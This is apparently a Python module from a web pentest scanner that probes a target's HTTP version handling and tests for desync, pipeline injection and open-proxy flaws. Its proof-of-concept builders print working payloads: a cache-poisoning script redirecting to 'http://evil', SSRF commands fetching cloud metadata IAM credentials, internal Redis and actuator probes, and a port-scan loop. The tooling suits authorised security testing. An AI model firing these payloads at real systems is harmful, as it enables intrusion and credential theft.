#!/usr/bin/env python3
"""
HTTP Version & Protocol Analyzer
---------------------------------
Tests support for different HTTP versions on a target, detects
misconfigurations (HTTP/0.9, pipeline injection, desync, open proxy)
and analyzes sensitive content leaks.
"""

from __future__ import annotations

import gzip
import hashlib
import socket
import ssl
import zlib
from typing import Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

from utils.style import Colors
from utils.utils import configure_logger, re, requests, time, urlparse

logger = configure_logger(__name__)

# ─────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────

PROXY_PROBE_URL = "http://httpbin.org/get"
PROXY_CONFIRM_URL = "http://httpbin.org/ip"
PROXY_INVALID_URL = "http://this-domain-should-never-exist-xyz123456.invalid/nonexistent"

DEFAULT_USER_AGENT = "python-requests/2.28.1"

TIMEOUT_SOCKET = 10
TIMEOUT_READ = 8
TIMEOUT_QUICK = 5

VALID_HTTP_VERSIONS = {"HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"}

# Versions to test (standard + malformed)
TEST_VERSIONS = [
    "HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3",
    "QUIC", "SHTTP/1.3",
    "HTTP/1.2", "HTTP/1.6", "HTTP/4.0", "HTTP/99.9", "HTTP/1.1.1",
    "HtTP/1.1", "INVALID/1.1", "", " HTTP/1.1", "HTTP/1.1 ",
]

# Critical leak signatures only
# No generic words ("config", "password") that match in any HTML page
CRITICAL_LEAK_SIGNATURES = [
    (b"root:x:0:0", "Unix /etc/passwd"),
    (b"[boot loader]", "Windows boot.ini"),
    (b"aws_access_key", "AWS credentials"),
    (b"private_key", "Private key material"),
    (b"-----begin rsa", "RSA private key"),
    (b"-----begin openssh", "SSH private key"),
    (b"mysql_connect(", "DB credentials in source"),
    (b"db_password", "Database password"),
    (b"api_key", "API key exposure"),
    (b"secret_key", "Secret key exposure"),
    (b"index of /", "Directory listing"),
    (b"<title>phpinfo", "PHP info page"),
]

# Error response signatures (false positives)
ERROR_SIGNATURES = [
    b"400 bad request",
    b"404 not found",
    b"405 method not allowed",
    b"500 internal server error",
    b"502 bad gateway",
    b"503 service unavailable",
    b"connection closed",
    b"invalid request",
]


# ─────────────────────────────────────────────────────────────
# Data classes
# ─────────────────────────────────────────────────────────────

@dataclass
class ParsedURL:
    """Parsed URL components."""

    scheme: str
    host: str | None
    port: int
    path: str

    @classmethod
    def from_url(cls, url: str) -> ParsedURL:
        u = urlparse(url)
        scheme = u.scheme or "http"
        host = u.hostname
        path = u.path or "/"
        if u.query:
            path = f"{path}?{u.query}"
        port = u.port or (443 if scheme == "https" else 80)
        return cls(scheme=scheme, host=host, port=port, path=path)

    @property
    def is_https(self) -> bool:
        return self.scheme == "https"


@dataclass
class VersionProbeResult:
    """Result of an HTTP version probe."""

    version: str
    code: int | None = None
    size: int = 0
    first_line: str = ""
    flags: list[str] = field(default_factory=list)
    accepted: bool = False
    server: str = ""


@dataclass
class VulnTestResult:
    """Result of a vulnerability test."""

    name: str
    vulnerable: bool = False
    reason: str = ""
    confidence: int = 0
    response_preview: str = ""
    poc: list[str] = field(default_factory=list)
    content_leaks: list[str] = field(default_factory=list)


# ─────────────────────────────────────────────────────────────
# Network helpers
# ─────────────────────────────────────────────────────────────

def create_socket(
    target: ParsedURL,
    *,
    force_h1: bool = False,
    timeout: int = TIMEOUT_SOCKET,
) -> socket.socket | ssl.SSLSocket:
    """Creates a TCP or TLS socket to the target."""
    raw = socket.create_connection((target.host, target.port), timeout=timeout)
    if not target.is_https:
        return raw

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if force_h1:
        try:
            ctx.set_alpn_protocols(["http/1.1"])
        except Exception:
            pass
    return ctx.wrap_socket(raw, server_hostname=target.host)


def send_recv(
    sock: socket.socket | ssl.SSLSocket,
    data: bytes | None,
    read_timeout: int = TIMEOUT_READ,
) -> bytes:
    """Sends data and reads the full response.

    Handles Content-Length, Transfer-Encoding: chunked, and graceful timeout.
    """
    sock.settimeout(read_timeout)
    if data:
        sock.sendall(data)
    time.sleep(0.1)

    buf = b""
    headers_done = False
    content_length: int | None = None
    is_chunked = False

    try:
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                buf += chunk

                if not headers_done and b"\r\n\r\n" in buf:
                    headers_done = True
                    header_section = buf.split(b"\r\n\r\n")[0].lower()

                    for line in header_section.split(b"\r\n"):
                        if line.startswith(b"content-length:"):
                            try:
                                content_length = int(line.split(b":")[1].strip())
                            except ValueError:
                                pass
                        elif line.startswith(b"transfer-encoding:") and b"chunked" in line:
                            is_chunked = True

                if headers_done and content_length is not None and not is_chunked:
                    body_offset = buf.find(b"\r\n\r\n") + 4
                    if len(buf) - body_offset >= content_length:
                        break

                if headers_done and is_chunked and buf.endswith(b"0\r\n\r\n"):
                    break

            except (socket.timeout, OSError):
                break
    except Exception:
        pass

    return buf


# ─────────────────────────────────────────────────────────────
# HTTP response parsing
# ─────────────────────────────────────────────────────────────

def parse_status_line(raw: bytes) -> tuple[str, int | None]:
    """Extracts the status line and HTTP code."""
    try:
        line = raw.split(b"\r\n", 1)[0][:200]
        m = re.search(rb"HTTP/\d\.\d\s+(\d+)", line)
        return line.decode(errors="replace"), int(m.group(1)) if m else None
    except Exception:
        return raw[:80].decode(errors="replace"), None


def extract_server_header(raw: bytes) -> str:
    """Extracts the Server header value from a raw HTTP response."""
    header_end = raw.find(b"\r\n\r\n")
    if header_end == -1:
        return ""

    try:
        header_text = raw[:header_end].decode("utf-8", errors="ignore")
    except Exception:
        return ""

    for line in header_text.split("\r\n")[1:]:
        if ":" in line:
            key, value = line.split(":", 1)
            if key.strip().lower() == "server":
                return value.strip()

    return ""


def decompress_body(raw: bytes) -> bytes:
    """Decompresses body if Content-Encoding is gzip/deflate/br."""
    header_end = raw.find(b"\r\n\r\n")
    if header_end == -1:
        return raw

    header_part = raw[:header_end].lower()
    body = raw[header_end + 4:]

    decompressors: dict[bytes, Any] = {
        b"content-encoding: gzip": lambda b: gzip.decompress(b),
        b"content-encoding: deflate": lambda b: zlib.decompress(b),
    }

    try:
        import brotli
        decompressors[b"content-encoding: br"] = lambda b: brotli.decompress(b)
    except ImportError:
        pass

    for marker, decompress_fn in decompressors.items():
        if marker in header_part:
            try:
                return raw[:header_end + 4] + decompress_fn(body)
            except Exception:
                pass

    return raw


def sanitize_status_line(fl: str) -> str:
    """Sanitizes the status line for display."""
    if not isinstance(fl, str):
        try:
            fl = str(fl)
        except Exception:
            return "Error"

    stripped = fl.lstrip().upper()
    if any(stripped.startswith(tag) for tag in ("<!DOCTYPE", "<HTML", "<")):
        return "Error (HTML response)"
    if "\ufffd" in fl:
        return "Binary/Unknown"
    return fl


def has_error_signature(response: bytes) -> bool:
    """Checks if the response contains error markers."""
    lower = response.lower()
    return any(sig in lower for sig in ERROR_SIGNATURES)


def get_response_body(raw: bytes) -> bytes:
    """Extracts the body from an HTTP response."""
    idx = raw.find(b"\r\n\r\n")
    return raw[idx + 4:] if idx != -1 else raw


def is_html_page(raw: bytes) -> bool:
    """Checks if the response is a standard HTML page."""
    body = get_response_body(raw).lstrip()[:200].lower()
    return body.startswith((b"<!doctype html", b"<html", b"<head", b"<body"))


# ─────────────────────────────────────────────────────────────
# ALPN / HTTP version detection
# ─────────────────────────────────────────────────────────────

def detect_alpn_protocols(target: ParsedURL) -> list[str]:
    """Detects supported HTTP protocols via ALPN (TLS only)."""
    if not target.is_https:
        return []
    try:
        raw = socket.create_connection(
            (target.host, target.port), timeout=TIMEOUT_SOCKET
        )
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        ssock = ctx.wrap_socket(raw, server_hostname=target.host)
        proto = ssock.selected_alpn_protocol()
        ssock.close()
        return [proto] if proto else []
    except Exception:
        return []


def classify_version_token(version: str) -> list[str]:
    """Detects anomalies in an HTTP version token.

    Possible flags:
    - empty_version   : empty token
    - leading_space   : leading whitespace
    - trailing_space  : trailing whitespace
    - malformed       : control characters (tab, CR, LF)
    - mixed_case      : incorrect casing (e.g. HtTP/1.1)
    - invalid_token   : non-standard version
    """
    if version == "":
        return ["empty_version"]

    flags: list[str] = []

    if version != version.strip():
        if version.startswith(" "):
            flags.append("leading_space")
        if version.endswith(" "):
            flags.append("trailing_space")

    if any(ch in version for ch in ("\t", "\r", "\n")):
        flags.append("malformed")

    if version.upper().startswith("HTTP/") and version != version.upper():
        flags.append("mixed_case")

    if version not in VALID_HTTP_VERSIONS:
        flags.append("invalid_token")

    return flags


# ─────────────────────────────────────────────────────────────
# HTTP/0.9 probing
# ─────────────────────────────────────────────────────────────

def is_http09_response(response: bytes) -> bool:
    """Determines if a response is HTTP/0.9.

    HTTP/0.9 = no status line, no headers, just raw content.
    """
    if not response:
        return False

    if b"HTTP/" in response[:200]:
        return False
    if b"Content-Type:" in response[:500] or b"Server:" in response[:500]:
        return False

    start = response[:500].lower()

    if any(start.startswith(tag) for tag in (
        b"<!doctype", b"<html", b"<head", b"<body", b"<title"
    )):
        return True

    if len(response) > 10 and not start.startswith(b"<"):
        return True

    return False


def probe_http09(target: ParsedURL) -> tuple[bool, bytes]:
    """Tests HTTP/0.9 support with 3 request variants.

    Requires at least 2 positive results with similar responses
    (MD5 hash) to confirm and avoid false positives.
    """
    request_variants = [
        f"GET {target.path}\r\n\r\n",
        f"GET {target.path}\n\n",
        f"GET {target.path}",
    ]

    results: list[tuple[bool, bytes]] = []

    for req_str in request_variants:
        try:
            sock = create_socket(target, force_h1=True)
            resp = send_recv(sock, req_str.encode(), read_timeout=12)
            time.sleep(0.05)
            try:
                resp += sock.recv(65535)
            except Exception:
                pass
            sock.close()
            results.append((is_http09_response(resp), resp))
        except Exception:
            results.append((False, b""))

    positives = [(ok, data) for ok, data in results if ok]

    if len(positives) >= 2:
        hashes = {
            hashlib.md5(data).hexdigest()  # nosec B324
            for _, data in positives
        }
        if len(hashes) <= 2:
            return True, positives[0][1]

    return False, b""


# ─────────────────────────────────────────────────────────────
# PoC builders (shared helper)
# ─────────────────────────────────────────────────────────────

def _get_connect_cmd(target: ParsedURL) -> str:
    """Returns the appropriate ncat/openssl command for the target."""
    if target.is_https:
        return f"openssl s_client -connect {target.host}:{target.port} -quiet"
    return f"ncat {target.host} {target.port}"


def _get_python_socket_lines(target: ParsedURL) -> tuple[str, list[str]]:
    """Returns (import_suffix, ssl_wrap_lines) for Python PoC snippets."""
    if not target.is_https:
        return "", []
    return ", ssl", [
        '  ctx = ssl.create_default_context()',
        '  ctx.check_hostname = False',
        '  ctx.verify_mode = ssl.CERT_NONE',
        f'  s = ctx.wrap_socket(s, server_hostname="{target.host}")',
    ]


# ─────────────────────────────────────────────────────────────
# Vulnerability tests (when HTTP/0.9 is supported)
# ─────────────────────────────────────────────────────────────

def test_desync_injection(target: ParsedURL) -> VulnTestResult:
    """Tests desync injection via HTTP/0.9.

    Sends a malformed request that attempts to inject a fake HTTP response
    into the stream. Only vulnerable if the server returns 200 OK
    with no error signature.
    """
    result = VulnTestResult(name="desync_injection")

    try:
        payload = f"GET {target.path}\n\rHTTP/1.1 200 OK\n\r\n\r".encode()

        sock = create_socket(target, force_h1=True)
        resp = send_recv(sock, payload)
        sock.close()

        _, code = parse_status_line(resp)

        if not resp or len(resp) < 10:
            result.reason = "Empty or too short response"
        elif has_error_signature(resp):
            result.reason = "Server rejected the malformed request"
        elif code == 200 and len(resp) > 100:
            result.vulnerable = True
            result.confidence = 70
            result.reason = "Server returned 200 OK to desync payload"
            result.response_preview = resp[:300].decode(errors="replace")
            result.poc = _build_desync_poc(target)
        else:
            result.reason = f"No desync evidence (code={code})"

    except Exception as e:
        result.reason = f"Error: {e.__class__.__name__}"

    return result


def _build_desync_poc(target: ParsedURL) -> list[str]:
    """Generates reproduction instructions for desync injection."""
    path = target.path
    connect = _get_connect_cmd(target)
    ssl_imp, ssl_lines = _get_python_socket_lines(target)

    return [
        "DESYNC INJECTION via HTTP/0.9",
        "",
        "Description:",
        "  The server accepts malformed HTTP/0.9 requests containing",
        "  an injected fake HTTP response. If a reverse proxy or cache",
        "  sits in front, this can cause a desync between the proxy and",
        "  backend, allowing arbitrary content to be served to other",
        "  users (cache poisoning, response splitting).",
        "",
        "Impact:",
        "  - Cache poisoning (serve malicious content to other users)",
        "  - HTTP response splitting / header injection",
        "  - Session hijacking via injected Set-Cookie",
        "  - Stored XSS via poisoned cache",
        "",
        "Reproduce with ncat/openssl:",
        f"  $ printf 'GET {path}\\n\\rHTTP/1.1 200 OK\\n\\r\\n\\r' | {connect}",
        "",
        "Reproduce with Python:",
        f'  import socket{ssl_imp}',
        f'  s = socket.create_connection(("{target.host}", {target.port}))',
        *ssl_lines,
        f'  s.sendall(b"GET {path}\\n\\rHTTP/1.1 200 OK\\n\\r\\n\\r")',
        '  print(s.recv(4096))',
        "",
        "Advanced exploitation (cache poisoning):",
        f'  payload = (b"GET {path}\\n\\r"',
        '             b"HTTP/1.1 200 OK\\r\\n"',
        '             b"Content-Type: text/html\\r\\n"',
        '             b"Content-Length: 44\\r\\n\\r\\n"',
        '             b"<script>document.location=\\"http://evil\\"</script>")',
        "",
        "Verification:",
        "  If the response contains the injected content (200 OK + custom body),",
        "  the server is vulnerable to desync. Then test with a cache/CDN in",
        "  front to confirm the real-world impact.",
    ]


def test_pipeline_injection(target: ParsedURL) -> VulnTestResult:
    """Tests pipeline injection via HTTP/0.9.

    Sends two GET requests in a single TCP stream. The ONLY reliable
    proof of pipeline is the presence of MULTIPLE distinct HTTP status
    lines in the response (e.g. "HTTP/1.1 200" appears 2+ times).

    A simple HTML page containing "/admin" or "config" is NOT
    evidence of pipeline -- it's just normal HTML content.
    """
    result = VulnTestResult(name="pipeline_injection")

    try:
        payload = f"GET {target.path}\n\rGET /admin\n\r".encode()

        sock = create_socket(target, force_h1=True)
        resp = send_recv(sock, payload)
        sock.close()

        if not resp or len(resp) < 10:
            result.reason = "Empty or too short response"
            return result

        if has_error_signature(resp):
            result.reason = "Server rejected the pipeline request"
            return result

        # Only reliable proof: multiple HTTP status lines in the stream
        http_responses = re.findall(rb"HTTP/\d\.\d\s+\d{3}", resp)

        if len(http_responses) > 1:
            result.vulnerable = True
            result.confidence = 85
            result.reason = (
                f"Multiple HTTP responses detected "
                f"({len(http_responses)} status lines)"
            )
            result.response_preview = resp[:500].decode(errors="replace")
            result.poc = _build_pipeline_poc(target, len(http_responses))
        else:
            result.reason = "Single response only -- no pipeline execution"

    except Exception as e:
        result.reason = f"Error: {e.__class__.__name__}"

    return result


def _build_pipeline_poc(target: ParsedURL, nb_responses: int) -> list[str]:
    """Generates reproduction instructions for pipeline injection."""
    path = target.path
    scheme = "https" if target.is_https else "http"
    connect = _get_connect_cmd(target)
    ssl_imp, ssl_lines = _get_python_socket_lines(target)

    return [
        "PIPELINE INJECTION via HTTP/0.9",
        "",
        "Description:",
        "  The server processes multiple requests sent in a single TCP",
        "  stream without HTTP version (0.9 format). Each request gets its",
        f"  own response ({nb_responses} HTTP status lines detected in the stream).",
        "  This allows accessing endpoints normally protected by a reverse",
        "  proxy or WAF that doesn't understand this format.",
        "",
        "Impact:",
        "  - WAF / reverse proxy rule bypass (path-based ACL)",
        "  - Access to internal endpoints (/admin, /debug, /actuator...)",
        "  - Information disclosure via unprotected endpoints",
        "  - Potential request smuggling if upstream proxy present",
        "",
        "Reproduce with ncat/openssl:",
        f"  $ printf 'GET {path}\\n\\rGET /admin\\n\\r' | {connect}",
        "",
        "  If you see 2+ 'HTTP/1.x ...' blocks in the response,",
        "  the server processed both requests independently.",
        "",
        "Reproduce with Python:",
        f'  import socket{ssl_imp}, re',
        f'  s = socket.create_connection(("{target.host}", {target.port}))',
        *ssl_lines,
        f'  s.sendall(b"GET {path}\\n\\rGET /admin\\n\\r")',
        '  resp = s.recv(65535)',
        "  print(f'Responses: {len(re.findall(rb\"HTTP/\\\\d\\\\.\\\\d\\\\s+\\\\d{3}\", resp))}')",
        "",
        "Endpoints to test as 2nd request:",
        "  GET /admin              GET /debug",
        "  GET /actuator/env       GET /server-status",
        "  GET /.env               GET /wp-admin",
        "  GET /api/internal       GET /graphql",
        "",
        "Compare with curl (no pipeline):",
        f"  $ curl -k -v {scheme}://{target.host}:{target.port}/admin",
        "  If curl returns 403 but the pipeline returns 200,",
        "  this confirms a reverse proxy / WAF bypass.",
    ]


def test_open_proxy(target: ParsedURL) -> VulnTestResult:
    """Tests if the server acts as an open proxy (forward proxy).

    3-step validation to eliminate false positives:

    1. Send GET http://httpbin.org/get as absolute URL
       -> Check for httpbin-specific JSON markers (origin, url, headers)

    2. Confirmation with GET http://httpbin.org/ip (different endpoint)
       -> Must return a small JSON {"origin": "x.x.x.x"}

    3. Anti false-positive: GET http://invalid-domain/
       -> If server returns 200 here too, it's a false positive

    Confidence score:
    - 50 if step 1 matches
    - +50 if step 2 confirms
    - = 0 if step 3 detects false positive
    """
    result = VulnTestResult(name="open_proxy")

    try:
        probe_host = urlparse(PROXY_PROBE_URL).hostname or ""
        if probe_host.lower() == (target.host or "").lower():
            result.reason = "Skipped -- target is httpbin itself"
            return result

        # Step 1: main test with httpbin.org/get
        payload = (
            f"GET {PROXY_PROBE_URL}\r\n"
            f"Host: httpbin.org\r\n\r\n"
        ).encode()

        sock = create_socket(target, force_h1=True)
        resp = send_recv(sock, payload)
        sock.close()

        step1_valid = _analyze_proxy_response(resp)

        # Step 2: confirmation with httpbin.org/ip
        step2_confirmed = False
        if step1_valid:
            step2_confirmed = _confirm_proxy_with_ip(target)

        # Step 3: anti false-positive
        is_false_positive = False
        if step1_valid:
            is_false_positive = _check_proxy_false_positive(target)

        # Verdict
        if is_false_positive:
            result.confidence = 0
            result.reason = (
                "False positive -- server responds 200 to invalid URLs too"
            )
        elif step1_valid and step2_confirmed:
            result.vulnerable = True
            result.confidence = 100
            result.reason = "Confirmed open proxy (double validation)"
            result.response_preview = resp[:500].decode(errors="replace")
            result.poc = _build_proxy_poc(target)
        elif step1_valid:
            result.confidence = 50
            result.reason = (
                "Partial match -- httpbin markers found "
                "but confirmation failed"
            )
        else:
            result.reason = "Response doesn't match proxy behavior"

    except Exception as e:
        result.reason = f"Error: {e.__class__.__name__}"

    return result


def _analyze_proxy_response(resp: bytes) -> bool:
    """Checks that the response contains httpbin-specific markers."""
    if not resp or len(resp) < 100:
        return False

    _, code = parse_status_line(resp)
    if code != 200:
        return False

    lower = resp.lower()

    if any(tag in lower for tag in (
        b"<html", b"<!doctype", b"error", b"exception"
    )):
        return False

    marker_pairs = [
        (b'"origin":', b'"url": "http://httpbin.org/get"'),
        (b'"args": {}', b'"headers": {'),
        (b'"user-agent":', b'"accept-encoding":'),
    ]

    hits = sum(1 for pair in marker_pairs if all(m in lower for m in pair))
    return hits >= 2


def _confirm_proxy_with_ip(target: ParsedURL) -> bool:
    """Confirmation via httpbin.org/ip (different endpoint)."""
    try:
        payload = (
            f"GET {PROXY_CONFIRM_URL}\r\n"
            f"Host: httpbin.org\r\n\r\n"
        ).encode()
        sock = create_socket(target, force_h1=True)
        resp = send_recv(sock, payload)
        sock.close()

        if (b'"origin":' in resp
                and resp.count(b'"') >= 4
                and b'.' in resp
                and len(resp) < 500):
            lower = resp.lower()
            if not any(x in lower for x in (b'<html', b'error', b'404')):
                return True
    except Exception:
        pass
    return False


def _check_proxy_false_positive(target: ParsedURL) -> bool:
    """Sends a request to an invalid domain. If 200 -> false positive."""
    try:
        payload = (
            f"GET {PROXY_INVALID_URL}\r\n"
            f"Host: this-domain-should-never-exist-xyz123456.invalid\r\n\r\n"
        ).encode()
        sock = create_socket(target, force_h1=True, timeout=TIMEOUT_QUICK)
        resp = send_recv(sock, payload, read_timeout=TIMEOUT_QUICK)
        sock.close()

        _, code = parse_status_line(resp)
        return code == 200 and len(resp) > 100
    except Exception:
        return False


def _build_proxy_poc(target: ParsedURL) -> list[str]:
    """Generates reproduction instructions for open proxy."""
    host = target.host
    port = target.port
    scheme = "https" if target.is_https else "http"
    connect = _get_connect_cmd(target)

    return [
        "OPEN PROXY (Forward Proxy / SSRF)",
        "",
        "Description:",
        "  The server accepts absolute URLs in the request line and",
        "  forwards the request to the host specified in the URL.",
        "  It acts as an open HTTP proxy, allowing access to internal",
        "  or external resources through the target server.",
        "",
        "Impact:",
        "  - SSRF (Server-Side Request Forgery)",
        "  - Access to cloud metadata (AWS/GCP/Azure IMDS)",
        "  - Internal port scanning through the server",
        "  - Firewall / NAC bypass to reach internal network",
        "  - Data exfiltration using the server as a relay",
        "",
        "Reproduce with ncat/openssl:",
        f"  $ printf 'GET http://httpbin.org/get\\r\\nHost: httpbin.org\\r\\n\\r\\n' | {connect}",
        "",
        "  Expected result: httpbin JSON response with 'origin' and 'url'.",
        "  If you see this JSON, the server relayed the request.",
        "",
        "Reproduce with curl (proxy mode):",
        f"  $ curl -x {scheme}://{host}:{port} http://httpbin.org/get",
        f"  $ curl -x {scheme}://{host}:{port} http://169.254.169.254/latest/meta-data/",
        "",
        "Reproduce with Python:",
        f'  import requests',
        f'  proxies = {{"http": "{scheme}://{host}:{port}", "https": "{scheme}://{host}:{port}"}}',
        f'  r = requests.get("http://httpbin.org/get", proxies=proxies)',
        f'  print(r.text)  # Should contain "origin" and "url"',
        "",
        "Exploitation payloads:",
        "",
        "  Cloud metadata (critical SSRF):",
        f'  $ printf "GET http://169.254.169.254/latest/meta-data/\\r\\nHost: 169.254.169.254\\r\\n\\r\\n" | {connect}',
        f'  $ printf "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/\\r\\nHost: 169.254.169.254\\r\\n\\r\\n" | {connect}',
        f'  $ printf "GET http://metadata.google.internal/computeMetadata/v1/?recursive=true\\r\\nHost: metadata.google.internal\\r\\nMetadata-Flavor: Google\\r\\n\\r\\n" | {connect}',
        "",
        "  Internal services:",
        f'  $ printf "GET http://127.0.0.1:6379/INFO\\r\\nHost: 127.0.0.1\\r\\n\\r\\n" | {connect}',
        f'  $ printf "GET http://127.0.0.1:9200/\\r\\nHost: 127.0.0.1\\r\\n\\r\\n" | {connect}',
        f'  $ printf "GET http://localhost:8080/actuator/env\\r\\nHost: localhost\\r\\n\\r\\n" | {connect}',
        "",
        "  Port scanning:",
        f'  $ for p in 22 80 443 3306 5432 6379 8080 9200; do',
        f'      printf "GET http://127.0.0.1:$p/\\r\\nHost: 127.0.0.1\\r\\n\\r\\n" | {connect}',
        f'      echo "--- port $p ---"',
        f'    done',
        "",
        "Verification:",
        "  1. The httpbin.org/get response should contain the target server's",
        "     IP in 'origin' (not your own IP)",
        "  2. Test with Burp Collaborator or webhook.site to confirm",
        "     the server is making the outbound request",
        f"  3. Compare: direct curl vs curl -x {scheme}://{host}:{port}",
    ]


# ─────────────────────────────────────────────────────────────
# Content leak analysis
# ─────────────────────────────────────────────────────────────

def scan_content_leaks(raw: bytes) -> list[str]:
    """Scans a response for critical data leaks.

    Ignores standard HTML pages to avoid false positives.
    Only keeps truly critical signatures (private keys,
    /etc/passwd, AWS credentials, etc.).
    """
    if not raw or len(raw) < 20:
        return []

    if is_html_page(raw):
        return []

    body = get_response_body(raw).lower()
    leaks: list[str] = []

    for signature, description in CRITICAL_LEAK_SIGNATURES:
        if signature in body:
            leaks.append(description)

    return leaks


# ─────────────────────────────────────────────────────────────
# Version probing (parallelized)
# ─────────────────────────────────────────────────────────────

def probe_single_version(
    target: ParsedURL, version: str
) -> VersionProbeResult:
    """Sends an HTTP request with a specific version and analyzes the response."""
    result = VersionProbeResult(
        version=version,
        flags=classify_version_token(version),
    )

    try:
        sock = create_socket(target, force_h1=True)
        version_str = f" {version}" if version else ""
        raw_req = (
            f"GET {target.path}{version_str}\r\n"
            f"Host: {target.host}\r\n"
            f"User-Agent: {DEFAULT_USER_AGENT}\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        resp = send_recv(sock, raw_req, read_timeout=15)
        sock.close()

        resp = decompress_body(resp)
        fl, code = parse_status_line(resp)

        result.code = code
        result.size = len(resp)
        result.first_line = fl
        result.accepted = (code is not None and code < 400) or code == 101
        result.server = extract_server_header(resp)

    except Exception as e:
        result.first_line = f"ERR: {e.__class__.__name__}"

    return result


def probe_all_versions(
    target: ParsedURL,
    versions: list[str],
    max_workers: int = 5,
) -> list[VersionProbeResult]:
    """Tests all HTTP versions in parallel."""
    results: list[VersionProbeResult] = []

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {
            pool.submit(probe_single_version, target, v): v
            for v in versions
        }
        for future in as_completed(futures):
            try:
                results.append(future.result())
            except Exception as e:
                v = futures[future]
                results.append(VersionProbeResult(
                    version=v,
                    first_line=f"ERR: {e.__class__.__name__}",
                    flags=classify_version_token(v),
                ))

    order = {v: i for i, v in enumerate(versions)}
    results.sort(key=lambda r: order.get(r.version, 999))
    return results


# ─────────────────────────────────────────────────────────────
# Display helpers
# ─────────────────────────────────────────────────────────────

def risk_badge(result: VersionProbeResult) -> str:
    """Returns a badge if the accepted version has anomalies."""
    risky_flags = {
        "empty_version", "leading_space", "trailing_space",
        "invalid_token", "mixed_case",
    }
    if result.accepted and risky_flags.intersection(result.flags):
        return f" {Colors.YELLOW}\U0001f4a1{Colors.RESET}"
    return ""


def print_line(
    v: str, code: int | None, size: int, extra: str = "", server: str = ""
) -> None:
    """Prints a formatted result line."""
    code_str = f"{code}" if code is not None else "\u2014"
    server_info = f" ({server[:30]})" if server and server != "Unknown" else ""
    print(f" \u251c\u2500\u2500 {v:<15}: {code_str:<3}   [{size}b]{server_info}     {extra}")


def print_version_table(label: str, items: list[VersionProbeResult]) -> None:
    """Prints a table of version probe results."""
    print(f"\n \u251c\u2500\u2500 {label} ({len(items)}):")
    for item in items:
        v = item.version if item.version != "" else "<empty>"
        flags = ",".join(item.flags) if item.flags else "N/A"
        badge = risk_badge(item)
        fl_sane = sanitize_status_line(item.first_line)
        extra = f"{badge} [{fl_sane}] flags={flags}"
        print_line(v, item.code, item.size, extra, item.server)


def print_vuln_result(vr: VulnTestResult) -> None:
    """Displays the result of a vulnerability test."""
    if vr.vulnerable:
        status = f"{Colors.RED}VULNERABLE{Colors.RESET}"
    else:
        status = f"{Colors.GREEN}SAFE{Colors.RESET}"

    conf_str = ""
    if vr.confidence > 0:
        if vr.confidence >= 90:
            conf_color = Colors.GREEN
        elif vr.confidence >= 50:
            conf_color = Colors.YELLOW
        else:
            conf_color = Colors.RED
        conf_str = f" [{conf_color}{vr.confidence}%{Colors.RESET}]"

    print(f"       - {vr.name}: {status}{conf_str}")
    print(f"         \u2514\u2500 {vr.reason}")

    if vr.vulnerable:
        if vr.response_preview:
            preview = repr(vr.response_preview[:150])
            print(f"         \u2514\u2500 Response preview: {preview}...")

        if vr.poc:
            print(f"         \u2514\u2500 {Colors.CYAN}PoC / Reproduction:{Colors.RESET}")
            for line in vr.poc:
                print(f"         \u2502   {line}")

    if vr.content_leaks:
        for leak in vr.content_leaks:
            print(f"         \u2514\u2500 {Colors.RED}LEAK DETECTED:{Colors.RESET} {leak}")


# ─────────────────────────────────────────────────────────────
# Main entry point
# ─────────────────────────────────────────────────────────────

def check_http_version(url: str) -> None:
    """Full HTTP version analysis and associated vulnerability checks.

    1. Base connectivity test
    2. ALPN detection (TLS)
    3. HTTP/0.9 probe + vulnerability tests if supported
    4. Probe all versions (standard + malformed) in parallel
    5. Display accepted/rejected versions with anomaly flags
    """
    print(f"{Colors.CYAN} \u251c Version & protocol analysis{Colors.RESET}")

    target = ParsedURL.from_url(url)

    # 1. Base connectivity
    try:
        requests.get(url, verify=False, allow_redirects=False, timeout=10)
    except Exception as e:
        print(f" \u251c\u2500\u2500 Base connectivity error: {e}")

    # 2. ALPN detection
    if target.is_https:
        alpn = detect_alpn_protocols(target)
        if alpn:
            print(f" \u251c\u2500\u2500 ALPN protocols: {', '.join(alpn)}")
        else:
            print(" \u251c\u2500\u2500 ALPN: no protocols detected")

    # 3. HTTP/0.9 test + vulnerabilities
    try:
        is_09, sample = probe_http09(target)
        if is_09:
            stat = f"{Colors.GREEN}Supported{Colors.RESET}"
        else:
            stat = f"{Colors.RED}Not supported{Colors.RESET}"
        print(f" \u251c\u2500\u2500 HTTP/0.9: {stat} [{len(sample)} bytes]")

        if is_09:
            connect = _get_connect_cmd(target)
            print(f"         \u2514\u2500 {Colors.CYAN}PoC:{Colors.RESET} printf 'GET {target.path}\\r\\n\\r\\n' | {connect}")

            vuln_tests = [
                test_desync_injection(target),
                test_pipeline_injection(target),
                test_open_proxy(target),
            ]

            for vr in vuln_tests:
                # Scan leaks only on confirmed vulnerabilities
                if vr.vulnerable and vr.response_preview:
                    vr.content_leaks = scan_content_leaks(
                        vr.response_preview.encode(errors="replace")
                    )
                print_vuln_result(vr)

    except Exception as e:
        print(f" \u251c\u2500\u2500 HTTP/0.9: error during testing: {e}")
        logger.exception("HTTP/0.9 testing error")

    # 4. Probe all versions (parallelized)
    versions_to_test = [v for v in TEST_VERSIONS if v != "HTTP/0.9"]
    weirds = probe_all_versions(target, versions_to_test)

    accepted = [item for item in weirds if item.accepted]
    rejected = [item for item in weirds if not item.accepted]

    if accepted:
        print_version_table("Accepted versions", accepted)

    if rejected:
        print_version_table("Rejected/Error versions", rejected[:10])